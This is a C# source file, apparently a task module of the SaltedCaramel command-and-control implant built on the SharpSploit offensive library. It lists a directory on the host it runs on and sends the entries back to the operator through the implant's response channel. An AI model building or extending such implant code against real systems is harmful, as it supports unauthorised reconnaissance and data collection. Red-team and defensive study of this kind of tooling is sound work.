using Newtonsoft.Json;
using SharpSploit.Enumeration;
using SharpSploit.Generic;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;

namespace SaltedCaramel.Tasks
{
    public class DirectoryList
    {
        public static void Execute(SCTaskObject task, SCImplant implant)
        {
            string path = task.@params;
            SharpSploitResultList<Host.FileSystemEntryResult> list;

            try
            {
                if (path != "")
                    list = Host.GetDirectoryListing(path);
                else
                    list = Host.GetDirectoryListing();

                List<Dictionary<string, string>> fileList = new List<Dictionary<string, string>>();

                foreach (Host.FileSystemEntryResult item in list)
                {
                    FileInfo f = new FileInfo(item.Name);
                    Dictionary<string, string> infoDict = new Dictionary<string, string>();
                    try
                    {
                        infoDict.Add("size", f.Length.ToString());
                        infoDict.Add("type", "file");
                        infoDict.Add("name", f.Name);
                        fileList.Add(infoDict);
                    }
                    catch
                    {
                        infoDict.Add("size", "0");
                        infoDict.Add("type", "dir");
                        infoDict.Add("name", item.Name);
                        fileList.Add(infoDict);
                    }
                }

                SCTaskResp response = new SCTaskResp(task.id, JsonConvert.SerializeObject(fileList));
                implant.PostResponse(response);
                implant.SendComplete(task.id);
                task.status = "complete";
                task.message = fileList.ToString();
            }
            catch (DirectoryNotFoundException)
            {
                Debug.WriteLine($"[!] DirectoryList - ERROR: Directory not found: {path}");
                implant.SendError(task.id, "Error: Directory not found.");
                task.status = "error";
                task.message = "Directory not found.";
            }
            catch (Exception e)
            {
                Debug.WriteLine($"DirectoryList - ERROR: {e.Message}");
                implant.SendError(task.id, $"Error: {e.Message}");
                task.status = "error";
                task.message = e.Message;
            }
        }
    }
}
